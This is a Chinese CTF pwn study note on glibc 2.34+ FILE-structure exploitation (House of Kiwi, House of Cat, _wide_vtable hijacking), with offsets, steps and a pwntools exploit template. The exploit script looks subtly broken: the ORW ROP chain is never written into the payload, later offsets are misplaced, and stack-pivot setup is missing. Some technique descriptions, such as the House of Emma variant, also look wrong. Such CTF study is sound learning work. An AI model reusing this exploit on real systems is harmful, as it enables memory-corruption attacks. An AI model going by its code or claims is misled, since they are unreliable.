---
title: glibc 2.34+ 的 IO 结构进阶 —— _IO_wfile / House of Kiwi / House of Cat
category: pwn
tags: [FSOP, _IO_wfile_jumps, house of kiwi, house of cat, _wide_data, 2.35]
signals: [程序中有 stdin stdout stderr 的读写操作, 能控制堆上内容但找不到 free_hook, glibc 版本 2.35 及以上, 程序最后调用 exit 或主函数返回, 有一次任意写或 largebin attack 能改 stderr 指针, 需要打开文件读到 flag 而不是直接 getshell, 题目开了 seccomp 只允许 open read write]
difficulty: hard
source: "evilpan IO_FILE 与高版本 glibc / House of Kiwi / 强网杯 House of Cat"
tools: [pwntools, gdb, pwndbg, one_gadget, seccomp-tools]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- 题目 libc 是 **2.35 / 2.36 / 2.37+**：`__free_hook` 与 `__malloc_hook` 已被彻底移除，`house of apple` 这类老套路需要重新审。
- 程序正常使用 `printf` / `puts` / `scanf` / `read`，**最后一定会 `exit` 或 main 返回** —— 这是 FSOP 的触发点。
- 题目给出 `libc.so.6`，`readelf -s | grep free_hook` 没有任何输出，确认是 2.34+。
- 堆上有可控的 chunk，能伪造 `_IO_FILE_plus`；有 UAF 能改 `stderr` / `_IO_list_all`。
- 题目开了 **seccomp 只允许 `open/read/write`**（ORW），需要 `setcontext` 或 `_IO_wfile` 链来构造 ROP。
- 能看到 `_IO_wfile_jumps`、`_IO_wfile_overflow`、`_IO_wdefault_xsputn` 这些符号被调用（`gdb` 栈回溯里出现）。
- 题目有「`_IO_2_1_stderr_` 被调用」的迹象：比如 `__malloc_assert` 触发、或 `_IO_check_libio` 报错。
- 强网杯 2022「House of Cat」、2021 强网杯「baby_diary」这类题。

## 二、原理

### 1. 为什么 `2.34+` 必须换思路

| 机制 | 变化 |
| --- | --- |
| `__free_hook` / `__malloc_hook` | **2.34 起被删除**（2.32 标记废弃） |
| `__malloc_assert` | 2.34 起不再走 `__fxprintf` → `fflush`，但**仍然调用 `__libc_message`**（可以借此触发 `fflush`） |
| `_IO_wide_data` 布局 | 2.33 起扩展了字段，`_wide_vtable` 固定在 `+0xa0` |
| vtable 校验 `IO_validate_vtable` | 早在 2.24 就存在，vtable 必须落在 `__libc_IO_vtables` 段内 |
| `_IO_wfile_jumps` 的 `__doallocate` | `_IO_wfile_overflow` 内部会通过 `_wide_vtable` 调 `__doallocate` |

### 2. `_IO_FILE_plus` / `_IO_wide_data` 关键偏移（x86-64）

```c
struct _IO_FILE_plus { struct _IO_FILE file; const struct _IO_jump_t *vtable; };
/* _IO_FILE 关键偏移 */
0x00 _flags      0x20 _IO_write_base   0x28 _IO_write_ptr   0x30 _IO_write_end
0x38 _IO_buf_base              0x70 _chain             0x88 _lock
0xa0 _wide_data                0xc0 _mode              0xd8 vtable
/* _IO_wide_data 关键偏移 */
0x18 _IO_write_base            0x20 _IO_write_ptr      0x30 _IO_buf_base
0x38 _IO_buf_end               0xa0 _wide_vtable
```

### 3. `_IO_wfile_overflow` 的路径（Cat / Apple 2 的核心）

```c
int _IO_wfile_overflow (FILE *f, wint_t wch) {
    if (f->_flags & _IO_NO_WRITES) { f->_flags |= _IO_ERR_SEEN; return WEOF; }  // ← 别带这个位
    if (f->_IO_write_ptr == f->_IO_buf_end || f->_IO_write_base == 0) {
        if (_IO_wdoallocbuf (f) < 0) return WEOF;
    }
    if (wch == WEOF) return _IO_wdo_write (f, f->_IO_write_base, ...);
    ...
}

static int _IO_wdoallocbuf (FILE *fp) {
    if (fp->_wide_data->_IO_buf_base) return 0;          // ← buf_base 必须为 0
    if (!(fp->_flags & _IO_UNBUFFERED))
        if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF) return 0;
    ...
}
```

`_IO_WDOALLOCATE(fp)` 展开为 `fp->_wide_data->_wide_vtable->__doallocate(fp)`：

```
*(fp->_wide_data + 0xa0)  →  _wide_vtable
*(_wide_vtable + 0x68)    →  __doallocate      ← 直接 call
```

这条路径上唯一的「合法性」要求是 `vtable` 字段（`_IO_FILE_plus + 0xd8`）落在 `__libc_IO_vtables` 段，
而 `_wide_vtable` **不做任何校验** —— 这就是 2.34+ 世界里最通用的劫持点。
### 4. House of Kiwi

触发点：`_int_malloc → sysmalloc → __malloc_assert`。2.34+ 的 `__malloc_assert` 仍会走
`__libc_message` → `fflush(stderr)`，于是改掉 `stderr` 指针就能在 `fflush` 中劫持控制流。
触发条件是让 top chunk 不满足 `sysmalloc` 的 checkpoint（`old_size < MINSIZE`、`prev_inuse` 为 0、
或 `old_top` 不按页对齐），因此 Kiwi 需要 **改 `stderr` 指针** 与 **改 top size** 两个原语。

早期 2.34（`ubuntu3` 之前）`vtable` 可任意指，`fflush` 里的 `_IO_file_sync` 能直接指到 `setcontext`；
之后的版本被 `IO_validate_vtable` 挡住，Kiwi 更多作为**触发手法**复用，劫持点改用下文的 `_wide_vtable` 路径。

### 5. House of Cat

本质上就是把上面那条 `_wide_vtable` 路径直接串到 `setcontext`（命名借自强网杯 2022 House of Cat）。
关键事实：**`_wide_vtable` 不经过 `IO_validate_vtable` 校验**，可以指向堆上任意位置。

只需三块：`_IO_FILE_plus`（`_flags=0`、`write_ptr>write_base`、`_lock` 可写、`_wide_data` 指向可控区、
`vtable=_IO_wfile_jumps`）、`_IO_wide_data`（`_IO_buf_base=0` 强制走 `_IO_wdoallocbuf`、
`_wide_vtable` 指向堆上）、`_wide_vtable`（`+0x68` 放 `setcontext+61`）。完整构造见第四节 exp。

`setcontext+61` 跳过 `endbr64 / push` 序列，直接从 `mov rsp, [rdx+0xa0]` 开始，
因此栈会被迁移到 `*(FILE + 0xa0)`，`rdx` 就是触发时的 FILE 指针。

### 6. 三者的适用对照

| 手法 | 触发点 | 适用版本 | 需要什么 |
| --- | --- | --- | --- |
| House of Kiwi | `__malloc_assert` → `fflush(stderr)` | 2.34 早期；2.35+ 需配合 `_IO_wfile` | 改 `stderr` + 改 top size |
| House of Apple 2 | `_IO_wfile_overflow` → `_wide_vtable->__doallocate` | 2.35 ~ 2.36 | `_freeres_list` 等字段未清空 |
| House of Cat | `_wide_vtable` 不校验 | 2.34 ~ 2.38 | 可控 `_wide_data` + 堆上 `_wide_vtable` |
| `_IO_wfile` 直接链 | `_IO_wfile_overflow` + `setcontext` | 2.35+ | 同上，最通用 |

## 三、解题步骤

1. **确认 libc 版本与可用 hook**
   ```bash
   ./libc.so.6 | head -1
   readelf -s libc.so.6 | grep -E 'free_hook|malloc_hook'
   # 2.34+ 应无输出
   ```
2. **找触发点**：程序最后是否 `exit`？是否有 `malloc` 能触发 `__malloc_assert`？能否改 `stderr`？
3. **泄漏**：先拿到 heap 地址与 libc 地址。
4. **准备伪造区**：用 largebin attack / UAF 把 `stderr` 或 `_IO_list_all` 指到可控 chunk。
5. **构造 `_IO_FILE_plus`**：
   - `_flags` 避开 `_IO_NO_WRITES`
   - `_IO_write_base < _IO_write_ptr`
   - `_lock` 指向可写地址（否则 `fflush` 卡死在 lock）
   - `vtable = _IO_wfile_jumps`
6. **构造 `_wide_data` 与 `_wide_vtable`**（Kiwi/Cat 路线），`setcontext+61` 是落点。
7. **布置 ROP 并触发 `exit` 或 `malloc`**。

## 四、可直接运行的 exp 脚本

```python
from pwn import *
context.binary = elf = ELF('./pwn')
libc = ELF('./libc-2.35.so')
context.log_level = 'info'
io = process(elf.path)
libc_base   = LIBC_BASE
heap_base   = HEAP_BASE
fake_IO     = heap_base + 0x2a0       # 伪造的 _IO_FILE_plus 起始地址
system      = libc_base + libc.sym['system']
setcontext  = libc_base + libc.sym['setcontext']
wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
open_addr   = libc_base + libc.sym['open']
read_addr   = libc_base + libc.sym['read']
write_addr  = libc_base + libc.sym['write']
pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret'), executable=True))
pop_rsi = libc_base + next(libc.search(asm('pop rsi; ret'), executable=True))
pop_rdx = libc_base + next(libc.search(asm('pop rdx; ret'), executable=True))
orw = flat([
    pop_rdi, fake_IO + 0x400, pop_rsi, 0, pop_rdx, 0, open_addr,   # open("/flag", 0, 0)
    pop_rdi, 3, pop_rsi, fake_IO + 0x500, pop_rdx, 0x100, read_addr,
    pop_rdi, 1, pop_rsi, fake_IO + 0x500, pop_rdx, 0x100, write_addr,
])
fake_io_data = flat({
    0x00: 0, 0x20: 0, 0x28: 1,      # _flags / _IO_write_base / _IO_write_ptr
    0x88: fake_IO + 0x300,           # _lock，必须可写
    0xa0: fake_IO + 0x100,           # _wide_data
    0xc0: 0,                         # _mode
    0xd8: wfile_jumps,               # vtable，必须落在 __libc_IO_vtables 段
}, length=0x100, filler=b'\x00')

fake_wide_data = flat({
    0x18: 0,                         # _wide_data->_IO_write_base
    0x30: 0,                         # _IO_buf_base = 0 → 触发 _IO_wdoallocbuf
    0xa0: fake_IO + 0x200,           # _wide_vtable：不受 IO_validate_vtable 检查
}, length=0x100, filler=b'\x00')

fake_wide_vtable = flat({0x68: setcontext + 61}, length=0x100, filler=b'\x00')

payload = fake_io_data + fake_wide_data + fake_wide_vtable
payload += flat({0x300: 0, 0x400: b'/flag\x00', 0x500: b''})
# ---------- 3. 写入伪造区并劫持 ----------
# a) largebin attack 把 stderr 改到 fake_IO；b) UAF 写伪造结构到 fake_IO
# edit(0, payload)

# ---------- 4. 触发 ----------
io.sendlineafter(b'> ', b'5')      # 退出 → exit → _IO_flush_all_lockp → _IO_OVERFLOW
io.interactive()
```

## 五、常见坑 / 变体

1. **`_lock` 必须是可写地址且内容为 0**：`_IO_flush_all_lockp` 会 `_IO_flockfile`，锁不合法会卡死。
2. **`vtable` 必须落在 `__libc_IO_vtables` 内**，而 **`_wide_vtable` 不校验** —— 这就是 Cat 能成的根本原因。
3. **`_flags` 不能带 `_IO_NO_WRITES`**，否则 `_IO_wfile_overflow` 直接返回 `WEOF`。
4. **`_wide_data->_IO_buf_base` 必须为 0**，否则 `_IO_wdoallocbuf` 提前返回，不触发 `__doallocate`。
5. **`__malloc_assert` 在 2.34+ 改为走 `__libc_message`**，不同发行版是否会 `fflush(stderr)` 有差异，需实测。
6. **2.37+ 对 `_wide_data` 加重了校验**（如 `_IO_write_base/ptr` 的相对关系），要用对应版本的 `libc.sym` 偏移。
7. **`one_gadget` 在 2.35 约束更多**：先跑 `one_gadget ./libc.so.6` 看 `[rsp+0x??] == NULL` 是否满足。
8. **变体：House of Emma** —— 借 `_IO_wfile_seekoff` 把 `_IO_buf_base` 设成目标地址，先 `mprotect` 再 ORW。
9. **变体：`_IO_wdefault_xsputn`** —— 让 `printf` 直接走 `xsputn`，少一次 `__doallocbuf` 的判断。

## 六、参考来源

- [evilpan: IO_FILE 与高版本 glibc 中的漏洞利用技巧](https://evilpan.com/2022/07/30/glibc-exp-tricks/)
- [4xura: House of Kiwi](https://4xura.com/binex/heap/house-of-kiwi/)
- [glibc 源码: libio/wfileops.c（_IO_wfile_overflow / _IO_wdoallocbuf）](https://github.com/bminor/glibc/blob/master/libio/wfileops.c)
- [glibc 源码: malloc/malloc.c（__malloc_assert / sysmalloc）](https://github.com/bminor/glibc/blob/master/malloc/malloc.c)
- [roderickchan: House of 系列总结](https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/)
- [CTF-Wiki: 堆利用入口](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/)
